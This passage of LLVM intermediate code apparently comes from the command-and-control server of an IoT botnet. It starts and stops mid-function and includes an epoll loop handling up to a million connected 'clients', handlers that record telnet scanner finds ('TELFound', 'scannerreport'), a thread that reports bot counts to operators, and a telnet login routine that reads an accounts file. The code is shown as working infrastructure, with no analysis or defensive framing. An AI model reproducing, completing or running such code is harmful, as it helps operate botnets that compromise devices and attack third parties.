
159:                                              ; preds = %155
  %160 = load i32, i32* %10, align 4
  %161 = call i32 @close(i32 %160)
  br label %88

162:                                              ; preds = %155
  %163 = load i32, i32* %10, align 4
  %164 = call i32 @close(i32 %163)
  br label %88

165:                                              ; preds = %144
  %166 = load i32, i32* %10, align 4
  %167 = call i32 @make_socket_non_blocking(i32 %166)
  store i32 %167, i32* %5, align 4
  %168 = load i32, i32* %5, align 4
  %169 = icmp eq i32 %168, -1
  br i1 %169, label %170, label %173

170:                                              ; preds = %165
  %171 = load i32, i32* %10, align 4
  %172 = call i32 @close(i32 %171)
  br label %195

173:                                              ; preds = %165
  %174 = load i32, i32* %10, align 4
  %175 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %3, i32 0, i32 1
  %176 = bitcast %union.epoll_data* %175 to i32*
  store i32 %174, i32* %176, align 1
  %177 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %3, i32 0, i32 0
  store i32 -2147483647, i32* %177, align 1
  %178 = load volatile i32, i32* @epollFD, align 4
  %179 = load i32, i32* %10, align 4
  %180 = call i32 @epoll_ctl(i32 %178, i32 1, i32 %179, %struct.epoll_event* %3) #9
  store i32 %180, i32* %5, align 4
  %181 = load i32, i32* %5, align 4
  %182 = icmp eq i32 %181, -1
  br i1 %182, label %183, label %186

183:                                              ; preds = %173
  call void @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.10, i64 0, i64 0))
  %184 = load i32, i32* %10, align 4
  %185 = call i32 @close(i32 %184)
  br label %195

186:                                              ; preds = %173
  %187 = load i32, i32* %10, align 4
  %188 = sext i32 %187 to i64
  %189 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %188
  %190 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %189, i32 0, i32 2
  store i8 1, i8* %190, align 1
  %191 = load i32, i32* %10, align 4
  %192 = call i64 @send(i32 %191, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.11, i64 0, i64 0), i64 14, i32 16384)
  %193 = load i32, i32* %10, align 4
  %194 = call i64 @send(i32 %193, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.12, i64 0, i64 0), i64 11, i32 16384)
  br label %88

195:                                              ; preds = %183, %170, %102, %101
  br label %304

196:                                              ; preds = %77
  %197 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %198 = load i32, i32* %7, align 4
  %199 = sext i32 %198 to i64
  %200 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %197, i64 %199
  %201 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %200, i32 0, i32 1
  %202 = bitcast %union.epoll_data* %201 to i32*
  %203 = load i32, i32* %202, align 1
  store i32 %203, i32* %13, align 4
  %204 = load i32, i32* %13, align 4
  %205 = sext i32 %204 to i64
  %206 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %205
  store %struct.clientdata_t* %206, %struct.clientdata_t** %14, align 8
  store i32 0, i32* %15, align 4
  %207 = load %struct.clientdata_t*, %struct.clientdata_t** %14, align 8
  %208 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %207, i32 0, i32 2
  store i8 1, i8* %208, align 1
  br label %209

209:                                              ; preds = %196, %292
  %210 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %210, i8 0, i64 2048, i1 false)
  br label %211

211:                                              ; preds = %275, %274, %267, %259, %243, %237, %209
  %212 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %212, i8 0, i64 2048, i1 false)
  %213 = icmp ne i8* %212, null
  br i1 %213, label %214, label %220

214:                                              ; preds = %211
  %215 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %216 = load i32, i32* %13, align 4
  %217 = call i32 @fdgets(i8* %215, i32 2048, i32 %216)
  %218 = sext i32 %217 to i64
  store i64 %218, i64* %16, align 8
  %219 = icmp sgt i64 %218, 0
  br label %220

220:                                              ; preds = %214, %211
  %221 = phi i1 [ false, %211 ], [ %219, %214 ]
  br i1 %221, label %222, label %278

222:                                              ; preds = %220
  %223 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %224 = call i8* @strstr(i8* %223, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i64 0, i64 0)) #8
  %225 = icmp eq i8* %224, null
  br i1 %225, label %226, label %227

226:                                              ; preds = %222
  store i32 1, i32* %15, align 4
  br label %278

227:                                              ; preds = %222
  %228 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  call void @trim(i8* %228)
  %229 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %230 = call i32 @strcmp(i8* %229, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0)) #8
  %231 = icmp eq i32 %230, 0
  br i1 %231, label %232, label %238

232:                                              ; preds = %227
  %233 = load i32, i32* %13, align 4
  %234 = call i64 @send(i32 %233, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.13, i64 0, i64 0), i64 5, i32 16384)
  %235 = icmp eq i64 %234, -1
  br i1 %235, label %236, label %237

236:                                              ; preds = %232
  store i32 1, i32* %15, align 4
  br label %278

237:                                              ; preds = %232
  br label %211, !llvm.loop !13

238:                                              ; preds = %227
  %239 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %240 = call i8* @strstr(i8* %239, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.14, i64 0, i64 0)) #8
  %241 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %242 = icmp eq i8* %240, %241
  br i1 %242, label %243, label %254

243:                                              ; preds = %238
  %244 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %245 = call i8* @strstr(i8* %244, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.14, i64 0, i64 0)) #8
  %246 = getelementptr inbounds i8, i8* %245, i64 7
  store i8* %246, i8** %18, align 8
  %247 = load %struct._IO_FILE*, %struct._IO_FILE** @telFD, align 8
  %248 = load i8*, i8** %18, align 8
  %249 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %247, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.15, i64 0, i64 0), i8* %248)
  %250 = load %struct._IO_FILE*, %struct._IO_FILE** @telFD, align 8
  %251 = call i32 @fflush(%struct._IO_FILE* %250)
  %252 = load volatile i32, i32* @TELFound, align 4
  %253 = add nsw i32 %252, 1
  store volatile i32 %253, i32* @TELFound, align 4
  br label %211, !llvm.loop !13

254:                                              ; preds = %238
  %255 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %256 = call i8* @strstr(i8* %255, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.16, i64 0, i64 0)) #8
  %257 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %258 = icmp eq i8* %256, %257
  br i1 %258, label %259, label %262

259:                                              ; preds = %254
  %260 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %261 = call i8* @strstr(i8* %260, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.16, i64 0, i64 0)) #8
  store i8* %261, i8** %19, align 8
  store volatile i32 1, i32* @scannerreport, align 4
  br label %211, !llvm.loop !13

262:                                              ; preds = %254
  %263 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %264 = call i8* @strstr(i8* %263, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.17, i64 0, i64 0)) #8
  %265 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %266 = icmp eq i8* %264, %265
  br i1 %266, label %267, label %270

267:                                              ; preds = %262
  %268 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %269 = call i8* @strstr(i8* %268, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.17, i64 0, i64 0)) #8
  store i8* %269, i8** %20, align 8
  store volatile i32 0, i32* @scannerreport, align 4
  br label %211, !llvm.loop !13

270:                                              ; preds = %262
  %271 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %272 = call i32 @strcmp(i8* %271, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.18, i64 0, i64 0)) #8
  %273 = icmp eq i32 %272, 0
  br i1 %273, label %274, label %275

274:                                              ; preds = %270
  br label %211, !llvm.loop !13

275:                                              ; preds = %270
  %276 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %277 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.19, i64 0, i64 0), i8* %276)
  br label %211, !llvm.loop !13

278:                                              ; preds = %236, %226, %220
  %279 = load i64, i64* %16, align 8
  %280 = icmp eq i64 %279, -1
  br i1 %280, label %281, label %287

281:                                              ; preds = %278
  %282 = call i32* @__errno_location() #10
  %283 = load i32, i32* %282, align 4
  %284 = icmp ne i32 %283, 11
  br i1 %284, label %285, label %286

285:                                              ; preds = %281
  store i32 1, i32* %15, align 4
  br label %286

286:                                              ; preds = %285, %281
  br label %293

287:                                              ; preds = %278
  %288 = load i64, i64* %16, align 8
  %289 = icmp eq i64 %288, 0
  br i1 %289, label %290, label %291

290:                                              ; preds = %287
  store i32 1, i32* %15, align 4
  br label %293

291:                                              ; preds = %287
  br label %292

292:                                              ; preds = %291
  br label %209

293:                                              ; preds = %290, %286
  %294 = load i32, i32* %15, align 4
  %295 = icmp ne i32 %294, 0
  br i1 %295, label %296, label %301

296:                                              ; preds = %293
  %297 = load %struct.clientdata_t*, %struct.clientdata_t** %14, align 8
  %298 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %297, i32 0, i32 2
  store i8 0, i8* %298, align 1
  %299 = load i32, i32* %13, align 4
  %300 = call i32 @close(i32 %299)
  br label %301

301:                                              ; preds = %296, %293
  br label %302

302:                                              ; preds = %301
  br label %303

303:                                              ; preds = %302
  br label %304

304:                                              ; preds = %303, %195, %58
  %305 = load i32, i32* %7, align 4
  %306 = add nsw i32 %305, 1
  store i32 %306, i32* %7, align 4
  br label %27, !llvm.loop !14

307:                                              ; preds = %27
  br label %23
}

; Function Attrs: nounwind
declare noalias align 16 i8* @calloc(i64, i64) #3

declare i32 @epoll_wait(i32, %struct.epoll_event*, i32, i32) #1

declare i32 @close(i32) #1

declare i32 @accept(i32, %struct.sockaddr*, i32*) #1

; Function Attrs: nounwind readnone willreturn
declare i32* @__errno_location() #5

declare void @perror(i8*) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal i32 @make_socket_non_blocking(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %6 = load i32, i32* %3, align 4
  %7 = call i32 (i32, i32, ...) @fcntl(i32 %6, i32 3, i32 0)
  store i32 %7, i32* %4, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp eq i32 %8, -1
  br i1 %9, label %10, label %11

10:                                               ; preds = %1
  call void @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.68, i64 0, i64 0))
  store i32 -1, i32* %2, align 4
  br label %21

11:                                               ; preds = %1
  %12 = load i32, i32* %4, align 4
  %13 = or i32 %12, 2048
  store i32 %13, i32* %4, align 4
  %14 = load i32, i32* %3, align 4
  %15 = load i32, i32* %4, align 4
  %16 = call i32 (i32, i32, ...) @fcntl(i32 %14, i32 4, i32 %15)
  store i32 %16, i32* %5, align 4
  %17 = load i32, i32* %5, align 4
  %18 = icmp eq i32 %17, -1
  br i1 %18, label %19, label %20

19:                                               ; preds = %11
  call void @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.68, i64 0, i64 0))
  store i32 -1, i32* %2, align 4
  br label %21

20:                                               ; preds = %11
  store i32 0, i32* %2, align 4
  br label %21

21:                                               ; preds = %20, %19, %10
  %22 = load i32, i32* %2, align 4
  ret i32 %22
}

; Function Attrs: nounwind
declare i32 @epoll_ctl(i32, i32, i32, %struct.epoll_event*) #3

; Function Attrs: nounwind readonly willreturn
declare i8* @strstr(i8*, i8*) #2

declare i32 @fprintf(%struct._IO_FILE*, i8*, ...) #1

declare i32 @fflush(%struct._IO_FILE*) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @clientsConnected() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  store i32 0, i32* %2, align 4
  store i32 0, i32* %1, align 4
  br label %3

3:                                                ; preds = %17, %0
  %4 = load i32, i32* %1, align 4
  %5 = icmp slt i32 %4, 1000000
  br i1 %5, label %6, label %20

6:                                                ; preds = %3
  %7 = load i32, i32* %1, align 4
  %8 = sext i32 %7 to i64
  %9 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %8
  %10 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %9, i32 0, i32 2
  %11 = load i8, i8* %10, align 1
  %12 = icmp ne i8 %11, 0
  br i1 %12, label %14, label %13

13:                                               ; preds = %6
  br label %17

14:                                               ; preds = %6
  %15 = load i32, i32* %2, align 4
  %16 = add nsw i32 %15, 1
  store i32 %16, i32* %2, align 4
  br label %17

17:                                               ; preds = %14, %13
  %18 = load i32, i32* %1, align 4
  %19 = add nsw i32 %18, 1
  store i32 %19, i32* %1, align 4
  br label %3, !llvm.loop !15

20:                                               ; preds = %3
  %21 = load i32, i32* %2, align 4
  ret i32 %21
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i8* @titleWriter(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca [2048 x i8], align 16
  store i8* %0, i8** %2, align 8
  %5 = load i8*, i8** %2, align 8
  %6 = ptrtoint i8* %5 to i32
  store i32 %6, i32* %3, align 4
  br label %7

7:                                                ; preds = %1, %20
  %8 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %8, i8 0, i64 2048, i1 false)
  %9 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i64 0, i64 0
  %10 = call i32 @clientsConnected()
  %11 = load volatile i32, i32* @managesConnected, align 4
  %12 = call i32 (i8*, i8*, ...) @sprintf(i8* %9, i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.20, i64 0, i64 0), i32 27, i32 %10, i32 %11, i32 7) #9
  %13 = load i32, i32* %3, align 4
  %14 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i64 0, i64 0
  %15 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i64 0, i64 0
  %16 = call i64 @strlen(i8* %15) #8
  %17 = call i64 @send(i32 %13, i8* %14, i64 %16, i32 16384)
  %18 = icmp eq i64 %17, -1
  br i1 %18, label %19, label %20

19:                                               ; preds = %7
  ret i8* null

20:                                               ; preds = %7
  %21 = call i32 @sleep(i32 2)
  br label %7
}

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #3

declare i32 @sleep(i32) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @Search_in_File(i8* %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca %struct._IO_FILE*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [512 x i8], align 16
  store i8* %0, i8** %3, align 8
  store i32 0, i32* %5, align 4
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  %9 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.21, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.22, i64 0, i64 0))
  store %struct._IO_FILE* %9, %struct._IO_FILE** %4, align 8
  %10 = icmp eq %struct._IO_FILE* %9, null
  br i1 %10, label %11, label %12

11:                                               ; preds = %1
  store i32 -1, i32* %2, align 4
  br label %42

12:                                               ; preds = %1
  br label %13

13:                                               ; preds = %27, %12
  %14 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i64 0, i64 0
  %15 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %16 = call i8* @fgets(i8* %14, i32 512, %struct._IO_FILE* %15)
  %17 = icmp ne i8* %16, null
  br i1 %17, label %18, label %30

18:                                               ; preds = %13
  %19 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i64 0, i64 0
  %20 = load i8*, i8** %3, align 8
  %21 = call i8* @strstr(i8* %19, i8* %20) #8
  %22 = icmp ne i8* %21, null
  br i1 %22, label %23, label %27

23:                                               ; preds = %18
  %24 = load i32, i32* %6, align 4
  %25 = add nsw i32 %24, 1
  store i32 %25, i32* %6, align 4
  %26 = load i32, i32* %5, align 4
  store i32 %26, i32* %7, align 4
  br label %27

27:                                               ; preds = %23, %18
  %28 = load i32, i32* %5, align 4
  %29 = add nsw i32 %28, 1
  store i32 %29, i32* %5, align 4
  br label %13, !llvm.loop !16

30:                                               ; preds = %13
  %31 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %32 = icmp ne %struct._IO_FILE* %31, null
  br i1 %32, label %33, label %36

33:                                               ; preds = %30
  %34 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %35 = call i32 @fclose(%struct._IO_FILE* %34)
  br label %36

36:                                               ; preds = %33, %30
  %37 = load i32, i32* %6, align 4
  %38 = icmp eq i32 %37, 0
  br i1 %38, label %39, label %40

39:                                               ; preds = %36
  store i32 0, i32* %2, align 4
  br label %42

40:                                               ; preds = %36
  %41 = load i32, i32* %7, align 4
  store i32 %41, i32* %2, align 4
  br label %42

42:                                               ; preds = %40, %39, %11
  %43 = load i32, i32* %2, align 4
  ret i32 %43
}

declare noalias %struct._IO_FILE* @fopen(i8*, i8*) #1

declare i8* @fgets(i8*, i32, %struct._IO_FILE*) #1

declare i32 @fclose(%struct._IO_FILE*) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i8* @telnetWorker(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i8*, align 8
  %4 = alloca [80 x i8], align 16
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i64, align 8
  %8 = alloca [2048 x i8], align 16
  %9 = alloca [2048 x i8], align 16
  %10 = alloca i8*, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i8*, align 8
  %13 = alloca [2048 x i8], align 16
  %14 = alloca %struct._IO_FILE*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca [80 x i8], align 16
  %19 = alloca [80 x i8], align 16
  %20 = alloca %struct._IO_FILE*, align 8
  store i8* %0, i8** %3, align 8
  %21 = load i8*, i8** %3, align 8
  %22 = ptrtoint i8* %21 to i32
  store i32 %22, i32* %5, align 4
  %23 = load volatile i32, i32* @managesConnected, align 4
  %24 = add nsw i32 %23, 1
  store volatile i32 %24, i32* @managesConnected, align 4
  %25 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %25, i8 0, i64 2048, i1 false)
  %26 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %26, i8 0, i64 2048, i1 false)
  %27 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %27, i8 0, i64 2048, i1 false)
  store i32 0, i32* %15, align 4
  %28 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.21, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.22, i64 0, i64 0))
  store %struct._IO_FILE* %28, %struct._IO_FILE** %14, align 8
  br label %29

29:                                               ; preds = %34, %1
  %30 = load %struct._IO_FILE*, %struct._IO_FILE** %14, align 8
  %31 = call i32 @feof(%struct._IO_FILE* %30) #9
  %32 = icmp ne i32 %31, 0
  %33 = xor i1 %32, true
  br i1 %33, label %34, label %39

34:                                               ; preds = %29
  %35 = load %struct._IO_FILE*, %struct._IO_FILE** %14, align 8
  %36 = call i32 @fgetc(%struct._IO_FILE* %35)
  store i32 %36, i32* %16, align 4
  %37 = load i32, i32* %15, align 4
  %38 = add nsw i32 %37, 1
  store i32 %38, i32* %15, align 4
  br label %29, !llvm.loop !17

39:                                               ; preds = %29
  store i32 0, i32* %17, align 4
  %40 = load %struct._IO_FILE*, %struct._IO_FILE** %14, align 8
  call void @rewind(%struct._IO_FILE* %40)
  br label %41

41:                                               ; preds = %46, %39
  %42 = load i32, i32* %17, align 4
  %43 = load i32, i32* %15, align 4
  %44 = sub nsw i32 %43, 1
  %45 = icmp ne i32 %42, %44
  br i1 %45, label %46, label %61

46:                                               ; preds = %41
  %47 = load %struct._IO_FILE*, %struct._IO_FILE** %14, align 8
  %48 = load i32, i32* %17, align 4
  %49 = sext i32 %48 to i64
  %50 = getelementptr inbounds [10 x %struct.account], [10 x %struct.account]* @accounts, i64 0, i64 %49
  %51 = getelementptr inbounds %struct.account, %struct.account* %50, i32 0, i32 0
  %52 = getelementptr inbounds [20 x i8], [20 x i8]* %51, i64 0, i64 0
  %53 = load i32, i32* %17, align 4
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds [10 x %struct.account], [10 x %struct.account]* @accounts, i64 0, i64 %54
  %56 = getelementptr inbounds %struct.account, %struct.account* %55, i32 0, i32 1
  %57 = getelementptr inbounds [20 x i8], [20 x i8]* %56, i64 0, i64 0
  %58 = call i32 (%struct._IO_FILE*, i8*, ...) @__isoc99_fscanf(%struct._IO_FILE* %47, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.23, i64 0, i64 0), i8* %52, i8* %57)
  %59 = load i32, i32* %17, align 4
  %60 = add nsw i32 %59, 1
  store i32 %60, i32* %17, align 4
  br label %41, !llvm.loop !18

61:                                               ; preds = %41
  %62 = load i32, i32* %5, align 4
  %63 = call i64 @send(i32 %62, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.24, i64 0, i64 0), i64 23, i32 16384)
  %64 = icmp eq i64 %63, -1
  br i1 %64, label %65, label %66

65:                                               ; preds = %61
  br label %378

66:                                               ; preds = %61
  %67 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %68 = load i32, i32* %5, align 4
  %69 = call i32 @fdgets(i8* %67, i32 2048, i32 %68)
  %70 = icmp slt i32 %69, 1
  br i1 %70, label %71, label %72

71:                                               ; preds = %66
  br label %378

72:                                               ; preds = %66
  %73 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  call void @trim(i8* %73)
  %74 = getelementptr inbounds [80 x i8], [80 x i8]* %4, i64 0, i64 0
  %75 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %76 = call i32 (i8*, i8*, ...) @sprintf(i8* %74, i8* %75) #9
  %77 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  store i8* %77, i8** %10, align 8
  %78 = load i8*, i8** %10, align 8
  %79 = call i32 @Search_in_File(i8* %78)
  store i32 %79, i32* %6, align 4
  %80 = load i8*, i8** %10, align 8
  %81 = load i32, i32* %6, align 4
  %82 = sext i32 %81 to i64
  %83 = getelementptr inbounds [10 x %struct.account], [10 x %struct.account]* @accounts, i64 0, i64 %82
  %84 = getelementptr inbounds %struct.account, %struct.account* %83, i32 0, i32 0
  %85 = getelementptr inbounds [20 x i8], [20 x i8]* %84, i64 0, i64 0
  %86 = call i32 @strcmp(i8* %80, i8* %85) #8
  %87 = icmp eq i32 %86, 0
  br i1 %87, label %88, label %112

88:                                               ; preds = %72
  %89 = load i32, i32* %5, align 4
  %90 = call i64 @send(i32 %89, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.26, i64 0, i64 0), i64 23, i32 16384)
  %91 = icmp eq i64 %90, -1
  br i1 %91, label %92, label %93

92:                                               ; preds = %88
  br label %378

93:                                               ; preds = %88
  %94 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %95 = load i32, i32* %5, align 4
  %96 = call i32 @fdgets(i8* %94, i32 2048, i32 %95)
  %97 = icmp slt i32 %96, 1
  br i1 %97, label %98, label %99

98:                                               ; preds = %93
  br label %378

99:                                               ; preds = %93
  %100 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  call void @trim(i8* %100)
  %101 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %102 = load i32, i32* %6, align 4
  %103 = sext i32 %102 to i64
  %104 = getelementptr inbounds [10 x %struct.account], [10 x %struct.account]* @accounts, i64 0, i64 %103
  %105 = getelementptr inbounds %struct.account, %struct.account* %104, i32 0, i32 1
  %106 = getelementptr inbounds [20 x i8], [20 x i8]* %105, i64 0, i64 0
  %107 = call i32 @strcmp(i8* %101, i8* %106) #8
  %108 = icmp ne i32 %107, 0
  br i1 %108, label %109, label %110

109:                                              ; preds = %99
  br label %113

110:                                              ; preds = %99
  %111 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %111, i8 0, i64 2048, i1 false)
  br label %135

112:                                              ; preds = %72
  br label %113

113:                                              ; preds = %112, %109
  %114 = load i32, i32* %5, align 4
  %115 = call i64 @send(i32 %114, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.27, i64 0, i64 0), i64 5, i32 16384)
  %116 = icmp eq i64 %115, -1
  br i1 %116, label %117, label %118

117:                                              ; preds = %113
  br label %378

118:                                              ; preds = %113
  %119 = load i32, i32* %5, align 4
  %120 = call i64 @send(i32 %119, i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.28, i64 0, i64 0), i64 44, i32 16384)
  %121 = icmp eq i64 %120, -1
  br i1 %121, label %122, label %123

122:                                              ; preds = %118
  br label %378

123:                                              ; preds = %118
  %124 = load i32, i32* %5, align 4
  %125 = call i64 @send(i32 %124, i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.29, i64 0, i64 0), i64 44, i32 16384)
  %126 = icmp eq i64 %125, -1
  br i1 %126, label %127, label %128

127:                                              ; preds = %123
  br label %378

128:                                              ; preds = %123
  %129 = load i32, i32* %5, align 4
  %130 = call i64 @send(i32 %129, i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.30, i64 0, i64 0), i64 43, i32 16384)
  %131 = icmp eq i64 %130, -1
  br i1 %131, label %132, label %133

132:                                              ; preds = %128
  br label %378

133:                                              ; preds = %128
  %134 = call i32 @sleep(i32 5)
  br label %378

135:                                              ; preds = %110
  %136 = load i8*, i8** %3, align 8
  %137 = call i32 @pthread_create(i64* %7, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %136) #9
  %138 = getelementptr inbounds [80 x i8], [80 x i8]* %18, i64 0, i64 0
  %139 = call i32 (i8*, i8*, ...) @sprintf(i8* %138, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.31, i64 0, i64 0)) #9
  %140 = getelementptr inbounds [80 x i8], [80 x i8]* %19, i64 0, i64 0
  %141 = call i32 (i8*, i8*, ...) @sprintf(i8* %140, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.32, i64 0, i64 0)) #9
  %142 = load i32, i32* %5, align 4
  %143 = call i64 @send(i32 %142, i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str.33, i64 0, i64 0), i64 51, i32 16384)
  %144 = icmp eq i64 %143, -1
  br i1 %144, label %145, label %146

145:                                              ; preds = %135
  br label %378

146:                                              ; preds = %135
  %147 = load i32, i32* %5, align 4
  %148 = getelementptr inbounds [80 x i8], [80 x i8]* %18, i64 0, i64 0
  %149 = getelementptr inbounds [80 x i8], [80 x i8]* %18, i64 0, i64 0
  %150 = call i64 @strlen(i8* %149) #8
  %151 = call i64 @send(i32 %147, i8* %148, i64 %150, i32 16384)
  %152 = icmp eq i64 %151, -1
  br i1 %152, label %153, label %154

153:                                              ; preds = %146
  br label %378

154:                                              ; preds = %146
  %155 = load i32, i32* %5, align 4
  %156 = getelementptr inbounds [80 x i8], [80 x i8]* %19, i64 0, i64 0
  %157 = getelementptr inbounds [80 x i8], [80 x i8]* %19, i64 0, i64 0
  %158 = call i64 @strlen(i8* %157) #8
  %159 = call i64 @send(i32 %155, i8* %156, i64 %158, i32 16384)
  %160 = icmp eq i64 %159, -1
  br i1 %160, label %161, label %162

161:                                              ; preds = %154
  br label %378

162:                                              ; preds = %154
  %163 = load i32, i32* %5, align 4
  %164 = call i64 @send(i32 %163, i8* getelementptr inbounds ([58 x i8], [58 x i8]* @.str.34, i64 0, i64 0), i64 50, i32 16384)
  %165 = icmp eq i64 %164, -1
  br i1 %165, label %166, label %167

166:                                              ; preds = %162
  br label %378

167:                                              ; preds = %162
  %168 = load i8*, i8** %3, align 8
  %169 = call i32 @pthread_create(i64* %7, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %168) #9
  %170 = load i32, i32* %5, align 4
